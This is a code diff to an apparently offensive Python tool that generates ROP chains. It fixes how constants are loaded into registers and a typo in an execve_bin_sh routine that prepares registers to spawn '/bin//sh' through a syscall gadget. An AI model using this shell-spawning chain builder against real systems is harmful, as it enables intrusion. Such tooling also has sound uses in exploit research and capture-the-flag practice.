@@ -2,6 +2,7 @@ import struct
 import sys
 import re
 import itertools
+from functools import reduce
 
 REGISTERS = [   "rax", "rbx", "rcx", "rdx", "rdi", "rsi", "rbp", "r9", "r10", "r11", "r12", "r13", "r14", "r15",
             ]
@@ -78,11 +79,10 @@ def makeLoadConstsIntoRegsSeq(gadgetList, regs, noClobber = []):
             for reg in p:
                 acc.append(makeLoadConstIntoRegSeq(gadgetList, reg, noClobber + regs_done))
                 regs_done.append(reg)
+            regLoaders = zip(p, acc)
             def loadConstsIntoRegs(consts, comments = [], isOffsets = []):
                 valsToLoad = dict(zip(regs, itertools.zip_longest(consts, comments, isOffsets)))
-                for i in len(p):
-                    reg = p[i]
-                    acc[i](*valsToLoad[i])
+                return reduce(lambda acc, regLoader: acc + regLoader[1](*valsToLoad[regLoader[0]]), regLoaders, '')
             return loadConstsIntoRegs
         except Exception: continue
     raise Exception("No way to load constants into all of the registers " + str(regs) + " in any order.")
@@ -190,7 +190,7 @@ def execve_bin_sh(GadgetList, data_section_addr):
     # rdi <- "Address of /bin//sh" - .data section's address
     # rsi <- 0
     # rdx <- 0
-    fd.write(loadConstsIntoRegs(GadgetList, ["rax", "rdi", "rsi", "rdx"], [], [59. data_section_addr, 0, 0], isOffsets = [False, True, False, False]))
+    fd.write(loadConstsIntoRegs(GadgetList, ["rax", "rdi", "rsi", "rdx"], [], [59, data_section_addr, 0, 0], isOffsets = [False, True, False, False]))
     
     # Get syscall
     syscallList = getSyscallGadgets(GadgetList)
